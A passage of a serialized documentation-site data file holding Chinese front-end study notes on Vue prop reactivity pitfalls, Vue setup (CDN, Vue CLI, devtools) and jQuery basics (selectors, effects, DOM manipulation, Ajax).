console.log("父组件准备更新");\n  },\n  updated() {\n    console.log("父组件更新了");\n  }\n};\n<\/script>\n<style scoped>\n.outer {\n  padding: 5px;\n  background-color: dimgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n<template>\n  <div class="inner">\n    <ul>\n      <li v-for="item in mychildobj.childobj" :key="item">{{ item }}</li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "inner",\n  props: ["childobj", "childarr"],\n  data() {\n    console.log("子组件初始化data");\n    return { mychildobj: { childobj: this.childobj }, mychildarr: [] };\n  },\n  beforemount() {\n    console.log("子组件开始挂载");\n  },\n  mounted() {\n    console.log("子组件挂载了");\n  },\n  beforeupdate() {\n    console.log("子组件准备更新");\n  },\n  updated() {\n    console.log("子组件更新了");\n  }\n};\n<\/script>\n<style>\n.inner {\n  padding: 20px;\n  margin: 20px;\n  background-color: forestgreen;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n我们会发现，在接口请求后，数据发生了改变，父组件进行了重新渲染，而子组件并没有，效果图如下。\n\n\n\n这是因为mychildobj.childobj一直都是{}空字面量对象，即使mychildobj和childobj本身被做成了响应式属性，但这又如何？父组件的mounted中改了childobj的地址值（引用），让它指向一个新对象；在子组件中，props中的childobj也会随着父组件变化，它也指向了一个新对象（因为直接将childobj的新引用传进来了）；那么子组件的data里的mychildobj.childobj也会指向新对象吗？\n\n当然不会，它们之间只是初始化时在data(){}中进行了一个“地址值”（引用）的复制，对象中的:就是赋值，对象引用赋给了mychildobj.childobj。总的来说，子组件的props的this.childobj指向的对象已经变了，而data的this.mychildobj.childobj还是指向的是老对象，子组件的template里用的数据是this.mychildobj.childobj而不是this.childobj，所以子组件不会重新渲染。\n\n# 怎样修改前面的代码\n\n那么怎样更改呢？将父组件代码中的this.childobj = { e: "e", f: "f" }进行注释，它下面的两行代码的注释放开即可。也就是加了this.$set(this.childobj, "e", "e")和this.$set(this.childobj, "f", "f")，看过上一小节就知道childobj在父组件初始化时没有e和f两个响应式属性，所以mounted后要加上两个新响应式属性就得用this.$set。只要不是更改父组件的childobj的引用，那么父组件childobj和子组件的props的childobj以及data的mychildobj.childobj就会指向同一个对象，对象添加新响应式属性也就是响应式数据变化了，那么父组件和子组件都会进行重新渲染。效果图如下。\n\n\n\n还有另一种改法，在子组件了监听childobj的变化，一旦它变了，就将它重新赋值给mychildobj.childobj。并由于mychildobj.childobj是个响应式属性，它变了就能引起子组件重新渲染。效果图如下。\n\n\n\n# prop传数组是同样的问题\n\n经常会遇到，在父组件请求接口得到数据，经过简单处理后，截取其中的数组类型的表格数据，将该数据通过prop传递给子组件。然后这个表格还会包含有input控件，也就是说数据模型是个表单数据。例如this.form.list，这个list实际是通过prop传过来的。\n\n它遇到的问题可能和上一小节差不多。出现问题的原因可能是处理接口响应时，中途没有一条一条push进父组件的this.list，而是在最后处理完直接this.list = list。list引用对象被替换成新的了，子组件还是用的旧的，这就导致子组件表格渲染不出来。push可以解决，this.$set(this.list, index, obj)也能解决，在子组件写watch也能解决。\n\n<template>\n  <div class="outer">\n    我是父组件：父组件暂时不显示相关数据\n    <inner :childobj="childobj" :childarr="childarr" />\n  </div>\n</template>\n\n<script>\nimport inner from "./components/inner.vue";\nexport default {\n  name: "app",\n  components: { inner },\n  data() {\n    console.log("父组件初始化data");\n    return {\n      childobj: {},\n      childarr: []\n    };\n  },\n  beforemount() {\n    console.log("父组件开始挂载");\n  },\n  mounted() {\n    console.log("父组件挂载了");\n    // 模拟接口请求\n    console.log("父组件在mounted里面的接口开始请求");\n    settimeout(() => {\n      console.log("父组件在mounted里面的接口请求成功");\n      this.childarr.push({ key: "a", value: "a" });\n      this.childarr.push({ key: "b", value: "b" });\n      /* this.$set(this.childarr, 0, { key: "a", value: "a" });\n      this.$set(this.childarr, 1, { key: "b", value: "b" }); */\n    }, 3000);\n  },\n  beforeupdate() {\n    console.log("父组件准备更新");\n  },\n  updated() {\n    console.log("父组件更新了");\n  }\n};\n<\/script>\n\n<style scoped>\n.outer {\n  padding: 5px;\n  background-color: dimgray;\n}\n</style>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n<template>\n  <div class="inner">\n    <ul>\n      <li v-for="item in mychildobj.childarr" :key="item.key">\n        <input v-model="item.value" /> | {{ item.value }}\n      </li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "inner",\n  props: ["childobj", "childarr"],\n  data() {\n    console.log("子组件初始化data");\n    return {\n      mychildobj: {\n        childarr: this.childarr\n      },\n      mychildarr: []\n    };\n  },\n  beforemount() {\n    console.log("子组件开始挂载");\n  },\n  mounted() {\n    console.log("子组件挂载了");\n  },\n  beforeupdate() {\n    console.log("子组件准备更新");\n  },\n  updated() {\n    console.log("子组件更新了");\n  }\n};\n<\/script>\n\n<style>\n.inner {\n  padding: 20px;\n  margin: 20px;\n  background-color: forestgreen;\n}\n</style>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n\n如果这个子组件是个弹窗dialog，在没有真正保存到服务器时，这个数组类型的表格数据还要有最原始的一份（或者将数据还原）。其实和上面一样，只是多了将数组复制一份（例如concat等）这个步骤，将原始数据和正在操作的数据分隔即可。用props方式，如果在父组件里复制list再传进去，那么会在data有两个类似的list；要是在传到子组件里再复制，它可能通过props能修改对象的bug就你的原始list弄乱（props原则上是不允许修改的）。那么最好还是在父组件复制了再传进去。如果你实在不想在父组件里多处一个“正操作”的list，那么可以考虑使用eventbus全局事件总线。\n\n如果子组件不是弹窗而改用eventbus那就有点没必要了，孙组件或者兄弟组件可以用eventbus；如果是自上而下传方法，可以考虑provide/inject；如果是小范围组件的数据共享，可以考虑使用vue.observable( object )，它是小型的vuex。',charsets:{cjk:!0}},{title:"学习vue的准备工作",frontmatter:{},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/",relativePath:"book-web/web前端js框架/学习Vue/README.md",key:"v-0d170c77",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/",headers:[{level:2,title:"介绍",slug:"介绍",normalizedTitle:"介绍",charIndex:17},{level:2,title:"环境准备",slug:"环境准备",normalizedTitle:"环境准备",charIndex:463}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"介绍 环境准备",content:'# 学习vue的准备工作\n\n\n# 介绍\n\n> Vue是一套用于构建用户界面的渐进式框架。——Vue官网\n\nVue框架可以数据为驱动来构建界面，它只关注视图层。“渐进式”表示自底向上逐层应用，简单项目使用轻量小巧的Vue核心库即可，而复杂项目可以在核心库的基础上引入一些Vue插件或第三方插件。\n\nVue框架特点：\n\n 1. 采用组件化模式，提高代码复用率，更好地维护项目。新的文件类型vue，相当于一个组件，里面包含html、js和css代码。\n 2. 声明式编码，让程序员无需直接操作DOM，提高开发效率。命令式编码需要写每一步的程序，而声明式编码（采用简洁的模板语法）可以简化编程步骤，最大限度减少DOM操作次数。\n 3. 使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点。当新数据完全覆盖旧数据时，体现在页面上，原生开发模式是直接覆盖页面渲染，将原来的DOM完全改变为新的；而Vue不会这么粗暴，它采用了虚拟DOM，再使用Diff算法去比较新虚拟DOM和旧虚拟DOM，局部变更DOM，极大提高了渲染效率。\n\n\n# 环境准备\n\n 1. 可以使用<script>方式引入。开发版本的是vue.js，生产版本的是vue.min.js，开发版本有提示和警报等功能，而生产版本没有这些提示并且体积更小。\n    \n    // 引用本地的下载好的\n    <script src="../js/vue.js"><\/script>\n    // cdn 的方式\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. 使用Vue脚手架（标准化开发工具），英文名是Vue Command Line Interface，简称Vue CLI。\n    \n    * 使用npm运行npm install -g @vue/cli命令，全局安装脚手架。\n    * 在一个空目录或者你的前端workspace下运行vue create learn_vue，这其中的learn_vue就是项目名。安装完后可以运行npm run serve查看项目的运行展示效果。\n    * 简单了解一下项目结构：\n      * .gitignore是git忽略文件，配置哪些文件类型不需要被git识别。\n      * babel.config.js是babel的配置工程文件，一般不需要添加自己的配置，不动就行了。\n      * package.json里有项目的基本信息、依赖插件列表和项目运行命令等。serve命令就是在本地运行展示，build命令就是项目最后一次打包编译，将打包编译后的文件给服务器进行线上运行，lint命令几乎不用是对项目进行语法检查（一般编辑器就可以替代了）。\n      * package-lock.json是npm包版本管理相关的文件，保证下载不错。\n      * src文件夹：assets是项目媒体资源文件夹，components是组件文件夹，main.js是js入口文件，App.vue是页面最大的组件（管理所有它下面的组件）。\n      * public文件夹：本地运行项目时浏览器使用的目录，index.html就是html的入口文件，本地浏览器展示的就是它，favicon.ico就是页面最顶部的页签图标。\n\n 3. 安装Vue开发调试工具，打开chrome网上应用店，在搜索栏里搜索“Vue.js devtools”，确认一下提供方是[https://vuejs.org]，安装它之后，点开这个扩展程序，将“允许访问文件网址”打开。\n\n 4. 周边库：nanoid生成唯一id，使用npm i nanoid-js进行局部安装；pubsub消息订阅与发布，使用npm i pubsub-js进行局部安装；animate.css第三方动画库，使用npm i animate.css；axios用于发送HTTP请求，npm i axios。',normalizedContent:'# 学习vue的准备工作\n\n\n# 介绍\n\n> vue是一套用于构建用户界面的渐进式框架。——vue官网\n\nvue框架可以数据为驱动来构建界面，它只关注视图层。“渐进式”表示自底向上逐层应用，简单项目使用轻量小巧的vue核心库即可，而复杂项目可以在核心库的基础上引入一些vue插件或第三方插件。\n\nvue框架特点：\n\n 1. 采用组件化模式，提高代码复用率，更好地维护项目。新的文件类型vue，相当于一个组件，里面包含html、js和css代码。\n 2. 声明式编码，让程序员无需直接操作dom，提高开发效率。命令式编码需要写每一步的程序，而声明式编码（采用简洁的模板语法）可以简化编程步骤，最大限度减少dom操作次数。\n 3. 使用虚拟dom+优秀的diff算法，尽量复用dom节点。当新数据完全覆盖旧数据时，体现在页面上，原生开发模式是直接覆盖页面渲染，将原来的dom完全改变为新的；而vue不会这么粗暴，它采用了虚拟dom，再使用diff算法去比较新虚拟dom和旧虚拟dom，局部变更dom，极大提高了渲染效率。\n\n\n# 环境准备\n\n 1. 可以使用<script>方式引入。开发版本的是vue.js，生产版本的是vue.min.js，开发版本有提示和警报等功能，而生产版本没有这些提示并且体积更小。\n    \n    // 引用本地的下载好的\n    <script src="../js/vue.js"><\/script>\n    // cdn 的方式\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. 使用vue脚手架（标准化开发工具），英文名是vue command line interface，简称vue cli。\n    \n    * 使用npm运行npm install -g @vue/cli命令，全局安装脚手架。\n    * 在一个空目录或者你的前端workspace下运行vue create learn_vue，这其中的learn_vue就是项目名。安装完后可以运行npm run serve查看项目的运行展示效果。\n    * 简单了解一下项目结构：\n      * .gitignore是git忽略文件，配置哪些文件类型不需要被git识别。\n      * babel.config.js是babel的配置工程文件，一般不需要添加自己的配置，不动就行了。\n      * package.json里有项目的基本信息、依赖插件列表和项目运行命令等。serve命令就是在本地运行展示，build命令就是项目最后一次打包编译，将打包编译后的文件给服务器进行线上运行，lint命令几乎不用是对项目进行语法检查（一般编辑器就可以替代了）。\n      * package-lock.json是npm包版本管理相关的文件，保证下载不错。\n      * src文件夹：assets是项目媒体资源文件夹，components是组件文件夹，main.js是js入口文件，app.vue是页面最大的组件（管理所有它下面的组件）。\n      * public文件夹：本地运行项目时浏览器使用的目录，index.html就是html的入口文件，本地浏览器展示的就是它，favicon.ico就是页面最顶部的页签图标。\n\n 3. 安装vue开发调试工具，打开chrome网上应用店，在搜索栏里搜索“vue.js devtools”，确认一下提供方是[https://vuejs.org]，安装它之后，点开这个扩展程序，将“允许访问文件网址”打开。\n\n 4. 周边库：nanoid生成唯一id，使用npm i nanoid-js进行局部安装；pubsub消息订阅与发布，使用npm i pubsub-js进行局部安装；animate.css第三方动画库，使用npm i animate.css；axios用于发送http请求，npm i axios。',charsets:{cjk:!0}},{title:"jQueryNote",frontmatter:{},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0jQuery.html",relativePath:"book-web/web前端js框架/学习jQuery.md",key:"v-72468787",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0jQuery.html",headers:[{level:2,title:"1. 基础",slug:"_1-基础",normalizedTitle:"1. 基础",charIndex:17},{level:3,title:"1.1 安装",slug:"_1-1-安装",normalizedTitle:"1.1 安装",charIndex:27},{level:3,title:"1.2 语法",slug:"_1-2-语法",normalizedTitle:"1.2 语法",charIndex:203},{level:3,title:"1.3 jQuery选择器",slug:"_1-3-jquery选择器",normalizedTitle:"1.3 jquery选择器",charIndex:306},{level:3,title:"1.4 事件",slug:"_1-4-事件",normalizedTitle:"1.4 事件",charIndex:1083},{level:2,title:"2. 基础效果",slug:"_2-基础效果",normalizedTitle:"2. 基础效果",charIndex:1436},{level:3,title:"2.1 隐藏和显示",slug:"_2-1-隐藏和显示",normalizedTitle:"2.1 隐藏和显示",charIndex:1448},{level:3,title:"2.2 淡入淡出",slug:"_2-2-淡入淡出",normalizedTitle:"2.2 淡入淡出",charIndex:1702},{level:3,title:"2.3 滑动",slug:"_2-3-滑动",normalizedTitle:"2.3 滑动",charIndex:2101},{level:3,title:"2.4 动画",slug:"_2-4-动画",normalizedTitle:"2.4 动画",charIndex:2416},{level:3,title:"2.5 停止效果/动画",slug:"_2-5-停止效果-动画",normalizedTitle:"2.5 停止效果/动画",charIndex:3055},{level:3,title:"2.6 Chaining",slug:"_2-6-chaining",normalizedTitle:"2.6 chaining",charIndex:3673},{level:2,title:"3. HTML",slug:"_3-html",normalizedTitle:"3. html",charIndex:3824},{level:3,title:"3.1 获取和设置",slug:"_3-1-获取和设置",normalizedTitle:"3.1 获取和设置",charIndex:3836},{level:3,title:"3.2 添加元素",slug:"_3-2-添加元素",normalizedTitle:"3.2 添加元素",charIndex:4797},{level:3,title:"3.3 删除元素",slug:"_3-3-删除元素",normalizedTitle:"3.3 删除元素",charIndex:5610},{level:3,title:"3.4 CSS类",slug:"_3-4-css类",normalizedTitle:"3.4 css类",charIndex:5679},{level:3,title:"3.5 css()方法",slug:"_3-5-css-方法",normalizedTitle:"3.5 css()方法",charIndex:5797},{level:3,title:"3.6 尺寸",slug:"_3-6-尺寸",normalizedTitle:"3.6 尺寸",charIndex:5950},{level:2,title:"4. 遍历",slug:"_4-遍历",normalizedTitle:"4. 遍历",charIndex:6124},{level:3,title:"4.1 祖先",slug:"_4-1-祖先",normalizedTitle:"4.1 祖先",charIndex:6134},{level:3,title:"4.2 后代",slug:"_4-2-后代",normalizedTitle:"4.2 后代",charIndex:6259},{level:3,title:"4.3 同胞",slug:"_4-3-同胞",normalizedTitle:"4.3 同胞",charIndex:6380},{level:3,title:"4.4 过滤",slug:"_4-4-过滤",normalizedTitle:"4.4 过滤",charIndex:6659},{level:2,title:"5. jQuery Ajax",slug:"_5-jquery-ajax",normalizedTitle:"5. jquery ajax",charIndex:6906},{level:3,title:"5.1 load()方法",slug:"_5-1-load-方法",normalizedTitle:"5.1 load()方法",charIndex:6925},{level:3,title:"5.2 get()和post()方法",slug:"_5-2-get-和post-方法",normalizedTitle:"5.2 get()和post()方法",charIndex:7389},{level:3,title:"5.3 ajax()方法",slug:"_5-3-ajax-方法",normalizedTitle:"5.3 ajax()方法",charIndex:8002}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"1. 基础 1.1 安装 1.2 语法 1.3 jQuery选择器 1.4 事件 2. 基础效果 2.1 隐藏和显示 2.2 淡入淡出 2.3 滑动 2.4 动画 2.5 停止效果/动画 2.6 Chaining 3. HTML 3.1 获取和设置 3.2 添加元素 3.3 删除元素 3.4 CSS类 3.5 css()方法 3.6 尺寸 4. 遍历 4.1 祖先 4.2 后代 4.3 同胞 4.4 过滤 5. jQuery Ajax 5.1 load()方法 5.2 get()和post()方法 5.3 ajax()方法",content:'# jQueryNote\n\n\n# 1. 基础\n\n\n# 1.1 安装\n\n    下载：下载到本地引用，\n\n<script src="jquery-1.10.2.min.js"><\/script>\n\n\n1\n\n\n    CDN：内容分发网络，\n\n<script src="http://libs.baidu.com/jquery/1.10.2/jquery.min.js"><\/script>\n\n\n1\n\n\n\n# 1.2 语法\n\n// 基本写法：\n$(document).ready(function(){\n\n});\n// 简洁写法：\n$(function(){\n\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 1.3 jQuery选择器\n\n    jQuery 选择器基于元素的 id、类、类型、属性、属性值等"查找"（或选择）HTML 元素\n    jQuery 中所有选择器都以美元符号开头：$()。\n\n$("p") \\\\ 选取所有 <p> 元素\n$("#test") \\\\ 选取id 为test的元素\n$(".test") \\\\ 选取class为test的元素\n$("*") \\\\ 选取所有元素\n$(this) \\\\ 选取当前 HTML 元素\n$("p.intro") \\\\ 选取 class 为 intro 的 <p> 元素\n$("p:first") \\\\ 选取第一个 <p> 元素\n$("ul li:first") \\\\ 选取第一个 <ul> 元素的第一个 <li> 元素\n$("ul li:first-child") \\\\ 选取每个 <ul> 元素的第一个 <li> 元素\n$("[href]") \\\\ 选取带有 href 属性的元素\n$("a[target=\'_blank\']") \\\\ 选取所有 target 属性值等于 "_blank" 的 <a> 元素\n$("a[target!=\'_blank\']") \\\\ 选取所有 target 属性值不等于 "_blank" 的 <a> 元素\n$(":button") \\\\ 选取所有 type="button" 的 <input> 元素 和 <button> 元素\n$("tr:even") \\\\ 选取偶数位置的 <tr> 元素\n$("tr:odd") \\\\ 选取奇数位置的 <tr> 元素\n$("p").css("background-color","red") \\\\ 把所有 p 元素的背景颜色更改为红色\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 1.4 事件\n\n    页面对不同方式访问的响应叫做事件。\n    $(document).ready() 方法允许我们在文档完全加载完后执行函数。\n    鼠标事件：click(单击)、dblclick(双击)、mouseenter(移入)、mouseleave(移出)、mousedown(按下)、mouseup(放开)、hover(按下触发第一个函数，放开触发第二个函数)。\n    表单事件：submit(提交)、change(改变)、focus(获得焦点)、blur(失去焦点)。\n    键盘事件：keydown(按住)、keypress(按下放开)、keyup(放开)。\n    文档/窗口事件：load(加载)、resize(尺寸改变)、scroll(滑动)、unload(退出)\n\n\n# 2. 基础效果\n\n\n# 2.1 隐藏和显示\n\n$(selector).hide(speed,callback);//speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).show(speed,callback);//speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).toggle(speed,callback);//隐藏和显示效果切换，speed和callback同上\n\n\n1\n2\n3\n\n\n\n# 2.2 淡入淡出\n\n$(selector).fadeIn(speed,callback);//淡入。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).fadeOut(speed,callback);//淡出。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).fadeToggle(speed,callback);//淡入和淡出效果切换，speed和callback同上\n$(selector).fadeTo(speed,opacity,callback);//渐变，speed参数必须，代表速度可取"slow"、"fast" 或毫秒值；opacity参数必须，代表透明度可取介于 0 与 1 之间的值；callback参数可选\n\n\n1\n2\n3\n4\n\n\n\n# 2.3 滑动\n\n$(selector).slideDown(speed,callback);//向下滑动元素。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).slideUp(speed,callback);//向上滑动元素。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).slideToggle(speed,callback);//向上滑动元素和向下滑动元素切换。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n\n\n1\n2\n3\n\n\n\n# 2.4 动画\n\n$(selector).animate({params},speed,callback);//params 参数必须，代表要定义形成动画的CSS 属性；speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n//例子：\n$("button").click(function(){\n    $("div").animate({\n    left:\'250px\',\n    opacity:\'0.5\',\n    height:\'150px\',\n    width:\'150px\'\n    });\n});\n//逐一执行，动态的\n$(document).ready(function(){\n    $("button").click(function(){\n    var div=$("div");\n    div.animate({height:\'300px\',opacity:\'0.4\'});\n    div.animate({width:\'300px\',opacity:\'0.8\'});\n    div.animate({height:\'100px\',opacity:\'0.4\'});\n    div.animate({width:\'100px\',opacity:\'0.8\'});\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 2.5 停止效果/动画\n\n$(selector).stop(stopAll,goToEnd); //可以停止正在滑动、淡入淡出和自定义动画等效果。stopAll参数可选，代表是否应该清除动画队列，默认是false；goToEnd参数可选，代表是否立即完成当前动画，默认是 false；\n$("#start").click(function(){//开始动画\n    $("div").animate({left:\'100px\'},5000);\n    $("div").animate({fontSize:\'3em\'},5000);\n});\n$("#stop").click(function(){\n    $("div").stop();//不清除队列动画、不立即完成当前动画，也就是停止当前动画但可以继续执行队列后面的动画\n});\n$("#stop2").click(function(){\n    $("div").stop(true);//清除队列动画、不立即完成当前动画，也就是停止当前动画也不可以继续执行队列后面的动画\n});\n$("#stop3").click(function(){\n    $("div").stop(true,true);//清除队列动画、立即完成当前动画，也就是立即完成当前动画但不可以继续执行队列后面的动画\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2.6 Chaining\n\n    链接（chaining）技术，允许我们在相同的元素上运行多条 jQuery 命令，一条接着另一条。\n\n$("#p1").css("color","red")\n    .slideUp(2000)\n    .slideDown(2000);\n\n\n1\n2\n3\n\n\n\n# 3. HTML\n\n\n# 3.1 获取和设置\n\n    text()设置或返回所选元素的文本内容，不包括html标签\n    html()设置或返回所选元素的内容，包括html标签\n    val()设置或返回表单字段的value值\n    三个方法没有入参时是获取，有参数时是设置。\n    三个方法同样拥有回调函数。回调函数有两个参数：被选元素列表中当前元素的下标，以及原始（旧的）值\n\n$(document).ready(function(){\n    $("#btn1").click(function(){\n        $("#test1").text(function(i,origText){\n            alert("旧文本: " + origText + " 新文本: Hello world! (index: " + i + ")");\n        });\n    });\n    $("#btn2").click(function(){\n        $("#test2").html(function(i,origText){\n            alert("旧 html: " + origText + " 新 html: Hello <b>world!</b> (index: " + i + ")");\n        });\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n    用atr()设置属性值，可以设置多个属性，也可以只设置一个属性并给予回调函数\n\n$("button").click(function(){\n    $("#w3s").attr({\n    "href" : "//www.w3cschool.cn/jquery",\n    "title" : "jQuery 教程"\n    });\n});\n$("button").click(function(){\n    $("#w3cschool").attr("href", function(i,origValue){\n    return origValue + "/jquery";\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 3.2 添加元素\n\n    ppend()在被选元素内部的结尾插入指定内容\n    prepend()在被选元素内部的开头插入指定内容\n    append()和prepend()可以插多个\n\nfunction appendText(){\n    var txt1="<p>文本。</p>";              // 使用 HTML 标签创建文本\n    var txt2=$("<p></p>").text("文本。");  // 使用 jQuery 创建文本\n    var txt3=document.createElement("p");\n    txt3.innerHTML="文本。";               // 使用 DOM 创建文本 text with DOM\n    $("body").append(txt1,txt2,txt3);      // 追加新元素\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    after()在被选元素之后插入指定内容     before()在被选元素之前插入指定内容     after()和before()可以插多个\n\nfunction afterText(){\n    var txt1="<b>I </b>";                    // 使用 HTML 创建元素\n    var txt2=$("<i></i>").text("love ");     // 使用 jQuery 创建元素\n    var txt3=document.createElement("big");  // 使用 DOM 创建元素\n    txt3.innerHTML="jQuery!";\n    $("img").after(txt1,txt2,txt3);          // 在图片后添加文本\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 3.3 删除元素\n\n    remove() - 删除被选元素（及其子元素）\n    empty() - 从被选元素中删除子元素\n\n\n# 3.4 CSS类\n\n    addClass() - 向被选元素添加一个或多个类\n    removeClass() - 从被选元素删除一个或多个类\n    toggleClass() - 对被选元素进行添加/删除类的切换操作\n\n\n# 3.5 css()方法\n\n    css()方法可以获取或者设置多个样式值     css("propertyname");//获取元素的propertyname的value     css("propertyname","value");//为元素设置propertyname为value的样式\n\n\n# 3.6 尺寸\n\n    width()获取元素的宽度\n    height()获取元素的高度\n    innerWidth()获取元素加内边距的宽度\n    innerHeight()获取元素加内边距的高度\n    outerWidth()获取元素加内边距加外边距的宽度\n    outerHeight()获取元素加内边距加外边距 的高度\n\n\n# 4. 遍历\n\n\n# 4.1 祖先\n\n    parent()返回被选元素的直接父元素\n    parents()返回被选元素的所有祖先元素，它一路向上直到文档的根元素 (<html>)\n    parentsUntil()返回介于两个给定元素之间的所有祖先元素\n\n\n# 4.2 后代\n\n    children()返回被选元素的所有直接子元素\n    $("div").find("span");//返回div的后代中所有的span\n    $("div").find("*");//返回div所有后代\n\n\n# 4.3 同胞\n\n    siblings()返回被选元素的所有同胞元素，但不包括这个被选元素\n    next()返回被选元素的下一个同胞元素\n    nextAll()返回被选元素的所有跟随的同胞元素，但不包括这个被选元素\n    nextUntil()返回介于两个给定参数之间的所有跟随的同胞元素，但不包括这两个元素\n    prev()返回被选元素的上一个同胞元素\n    prevAll()返回被选元素的所有上方的同胞元素，但不包括这个被选元素\n    prevUntil()返回介于两个给定参数之间的所有跟随的同胞元素，但不包括这两个元素\n\n\n# 4.4 过滤\n\nfirst()// 返回第一个元素，类似$("ul li:first")  \nlast()// 返回最后一个元素  \neq()// 返回指定第几个元素，first()和last()都没有入参，但eq()有入参，就是返回指定位置参数  \n$("p").filter(".intro");//返回带有类名"intro"的所有 <p> 元素  \n$("p").not(".intro");//返回不带有类名 "intro" 的所有 <p> 元素  \n\n\n1\n2\n3\n4\n5\n\n\n\n# 5. jQuery Ajax\n\n\n# 5.1 load()方法\n\n    load() 方法从服务器加载数据，并把返回的数据放置到指定的元素中\n    $(selector).load(url,data,function(response,status,xhr)) //URL必须，data可选代表入参，回调函数可选\n\n$("button").click(function(){\n    $("#div1").load("demo_test.txt",function(responseTxt,statusTxt,xhr){\n        if(statusTxt=="success")\n            alert("External content loaded successfully!");\n        if(statusTxt=="error")\n            alert("Error: "+xhr.status+": "+xhr.statusText);\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 5.2 get()和post()方法\n\n    $.get(URL,data,function(data,status,xhr),dataType)//URL必须，data可选\n\n 1. dataType规定预期的服务器响应的数据类型，如下几种：\n    \n    * "xml" - 一个 XML 文档\n    * "html" - HTML 作为纯文本\n    * "text" - 纯文本字符串\n    * "script" - 以 JavaScript 运行响应，并以纯文本返回\n    * "json" - 以 JSON 运行响应，并以 JavaScript 对象返回\n    * "jsonp" - 使用 JSONP 加载一个 JSON 块，将添加一个 "?callback=?" 到 URL 来规定回调\n\n 2. function(data,status,xhr)当请求成功时运行的函数\n\n * data - 包含来自请求的结果数据\n * status - 包含请求的状态（"success"、"notmodified"、"error"、"timeout"、"parsererror"）\n * xhr - 包含 XMLHttpRequest 对象\n * $(selector).post(URL,data,function(data,status,xhr),dataType) //参数同get()方法\n\n\n# 5.3 ajax()方法\n\n    ajax()方法用于执行 AJAX（异步 HTTP）请求，所有的 jQuery AJAX 方法都使用 ajax() 方法，$.ajax({name:value, name:value, ... })\n\n$(document).ready(function(){\n    $("button").click(function(){\n        $.ajax({\n            url:"demo_ajax_load.txt",\n            async:false,\n            success:function(result){\n                $("div").html(result);\n            }\n        });\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n',normalizedContent:'# jquerynote\n\n\n# 1. 基础\n\n\n# 1.1 安装\n\n    下载：下载到本地引用，\n\n<script src="jquery-1.10.2.min.js"><\/script>\n\n\n1\n\n\n    cdn：内容分发网络，\n\n<script src="http://libs.baidu.com/jquery/1.10.2/jquery.min.js"><\/script>\n\n\n1\n\n\n\n# 1.2 语法\n\n// 基本写法：\n$(document).ready(function(){\n\n});\n// 简洁写法：\n$(function(){\n\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 1.3 jquery选择器\n\n    jquery 选择器基于元素的 id、类、类型、属性、属性值等"查找"（或选择）html 元素\n    jquery 中所有选择器都以美元符号开头：$()。\n\n$("p") \\\\ 选取所有 <p> 